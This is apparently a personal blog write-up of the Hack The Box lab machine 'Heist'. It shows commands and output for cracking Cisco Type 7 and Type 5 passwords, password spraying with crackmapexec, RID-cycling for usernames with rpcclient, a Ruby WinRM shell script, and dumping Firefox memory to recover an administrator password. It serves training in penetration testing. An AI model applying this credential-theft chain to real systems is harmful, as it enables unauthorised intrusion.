---
layout: single
title: Heist - Hack The Box
excerpt: "Heist starts off with a support page with a username and a Cisco IOS config file containing hashed & encrypted passwords. After cracking two passwords from the config file and getting access to RPC on the Windows machine, I find additional usernames by RID cycling and then password spray to find a user that has WinRM access. Once I have a shell, I discover a running Firefox process and dump its memory to disk so I can do some expert-level forensics (ie: running `strings`) to find the administrator password."
date: 2019-11-30
classes: wide
header:
  teaser: /assets/images/htb-writeup-heist/heist_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - linux
  - cisco
  - hashes
  - creds spray
  - rpcclient
  - winrm
  - procdump
  - memory forensics
---

![](/assets/images/htb-writeup-heist/heist_logo.png)

Heist starts off with a support page with a username and a Cisco IOS config file containing hashed & encrypted passwords. After cracking two passwords from the config file and getting access to RPC on the Windows machine, I find additional usernames by RID cycling and then password spray to find a user that has WinRM access. Once I have a shell, I discover a running Firefox process and dump its memory to disk so I can do some expert-level forensics (ie: running `strings`) to find the administrator password.

## Summary

- The admin page has guest access enabled and we can find a Cisco IOS configuration file on there
- After cracking the three passwords from the config file, we are able to use rpcclient with one of the account to recover the list of usernames
- Then we password spray the credentials we have and find that user `chase` can log in with WinRM
- There's a Firefox process already running on the box and we can obtain a memory dump from it
- We find the administrator credentials in one of the browser request still in memory

## Portscan

```
root@kali:~/htb/heist# nmap -sC -sV -p- -oA heist 10.10.10.149
Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-10 20:39 EDT
Nmap scan report for heist.htb (10.10.10.149)
Host is up (0.0065s latency).
Not shown: 65530 filtered ports
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| http-title: Support Login Page
|_Requested resource was login.php
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49668/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -3m38s, deviation: 0s, median: -3m38s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2019-08-10 20:38:41
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 199.09 seconds
```

## Website

The webpage has a simple login page with an option to log in as guest at the bottom:

![](/assets/images/htb-writeup-heist/webpage1.png)

After logging in as guest, I find a Cisco configuration in the opened trouble tickets. I also make note of the `Hazard` username, this will be useful later.

![](/assets/images/htb-writeup-heist/webpage2.png)

![](/assets/images/htb-writeup-heist/config.png)

## Cracking some credentials

The Cisco IOS configuration file here has two different types of password hashes. Cisco uses various hash algorithms across different products and software versions. The old password encryption type is called Type 7 encryption and has been known to be extremely weak for about 20+ years now. I still see this being used in production environments every week even though it doesn't provide any real security (it's akin to just base64 encoding your passwords in your configs, it's trivial to recover the plaintext).

For the two usernames, the Type 7 passwords can be reversed with any of the many Type 7 reversing tools available such as [https://packetlife.net/toolbox/type7/](https://packetlife.net/toolbox/type7/). 
 - rout3r / $uperP@ssword
 - admin / Q4)sJu\Y8qz*A3?d

The enable password uses the Type 5 encryption which is just a salted MD5 hash. Again, these should be avoided whenever possible since they can be cracked pretty quickly using a GPU. Using Type 8 (PBKDF2) or Type 9 provides more security since it takes longer to crack.

With John, I'm quickly able to crack the password with the rockyou.txt list:

```
root@kali:~/htb/heist# john -w=/usr/share/wordlists/rockyou.txt hash.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
stealth1agent    (?)
```

## User enumeration with RPC client

I'll create `user.txt` and add the potential usernames that I have so far (`admin`, `administrator` and `hazard`) then do the same with passwords in `pass.txt`. To test all credentials, I use `crackmapexec`:

![](/assets/images/htb-writeup-heist/cme1.png)

I found one valid account: `hazard:stealth1agent`

Scanning with `smbmap` I don't find any open shares that this user has access to:

```
root@kali:~/htb/heist# smbmap -u hazard -p stealth1agent -H 10.10.10.149
[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.149...
[+] IP: 10.10.10.149:445	Name: heist.htb
	Disk                                                  	Permissions
	----                                                  	-----------
	ADMIN$                                            	NO ACCESS
	C$                                                	NO ACCESS
	IPC$                                              	READ ONLY
```

With `rpcclient` I can connect and query the SID for the `hazard` user:

```
root@kali:~/htb/heist# rpcclient -U hazard 10.10.10.149
Enter WORKGROUP\hazard's password:

rpcclient $> lookupnames hazard
hazard S-1-5-21-4254423774-1266059056-3197185112-1008 (User: 1)
```

I can enumerate the list of users with `lookupsids` by changing the last digit of the SID

![](/assets/images/htb-writeup-heist/sids.png)

I got two additional users: `chase` and `jason`

## Logging in to the box with WinRM and user chase

After password spraying with crackmapexec again, I found valid credentials for `chase`

![](/assets/images/htb-writeup-heist/cme2.png)

The port for WinRM is open so I'll use that to log in:

Note: I'm using [evil-winrm](https://github.com/Hackplayers/evil-winrm) these days but those screenshots were taken some time ago before I started using it.

```
require 'winrm'

# Author: Alamot

conn = WinRM::Connection.new(
  endpoint: 'http://10.10.10.149:5985/wsman',
  #transport: :ssl,
  user: 'chase',
  password: 'Q4)sJu\Y8qz*A3?d',
  :no_ssl_peer_verification => true
)

command=""

conn.shell(:powershell) do |shell|
    until command == "exit\n" do
        output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
        print(output.output.chomp)
        command = gets
        output = shell.run(command) do |stdout, stderr|
            STDOUT.print stdout
            STDERR.print stderr
        end
    end
    puts "Exiting with code #{output.exitcode}"
end
```

![](/assets/images/htb-writeup-heist/user.png)

## Extracting more credentials from Firefox

I'll upgrade that shell to a Meterpreter first:

![](/assets/images/htb-writeup-heist/msf1.png)

![](/assets/images/htb-writeup-heist/msf2.png)

![](/assets/images/htb-writeup-heist/msf3.png)

I check out the `c:\inetpub\wwwroot\` directory for any hardcoded credentials in the PHP code and find a SHA256 hash for an admin account in the `login.php` file:

```
hash( 'sha256', $_REQUEST['login_password']) === '91c077fb5bcdd1eacf7268c945bc1d1ce2faf9634cba615337adbf0af4db9040')
```

Fail: I wasn't able to crack this hash nor did I find it on crackstation.net.

When checking out the running processes, I notice that Firefox is running:

```
 6264  5232  firefox.exe              x64   1        SUPPORTDESK\Chase  C:\Program Files\Mozilla Firefox\firefox.exe
 6388  6264  firefox.exe              x64   1        SUPPORTDESK\Chase  C:\Program Files\Mozilla Firefox\firefox.exe
 6588  792   wsmprovhost.exe          x64   0        SUPPORTDESK\Chase  C:\Windows\System32\wsmprovhost.exe
 6656  6264  firefox.exe              x64   1        SUPPORTDESK\Chase  C:\Program Files\Mozilla Firefox\firefox.exe
 6732  792   dllhost.exe              x64   1        SUPPORTDESK\Chase  C:\Windows\System32\dllhost.exe
 7052  6264  firefox.exe              x64   1        SUPPORTDESK\Chase  C:\Program Files\Mozilla Firefox\firefox.exe
```

If Firefox is running then there might some credentials in memory so I'll use procdump to create a memory dump and inspect it after:

![](/assets/images/htb-writeup-heist/dump1.png)

Before using a memory forensics tool like Volatility to inspect the memory dump, I'll try using strings and grep to look for the string `password`:

![](/assets/images/htb-writeup-heist/admin.png)

Looks like I found the admin's credentials, I'll use WinRM again to log in:

![](/assets/images/htb-writeup-heist/root.png)